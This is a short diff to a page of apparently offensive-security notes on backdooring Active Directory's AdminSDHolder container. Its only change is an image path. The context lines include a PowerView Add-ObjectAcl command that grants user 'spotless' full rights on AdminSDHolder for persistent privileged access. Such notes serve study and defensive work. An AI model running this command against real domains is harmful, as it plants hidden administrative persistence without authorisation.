@@ -10,7 +10,7 @@ Backdooring the AdminSDHolder container by adding an ACL that provides user `spo
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All
 ```
 
-![](<../../../.gitbook/assets/image (52) (1).png>)
+![](<../../../.gitbook/assets/image (52) (1) (1).png>)
 
 This is actually what happens to the container - the security ACLs get updated and spotless gets all the privileges:
 
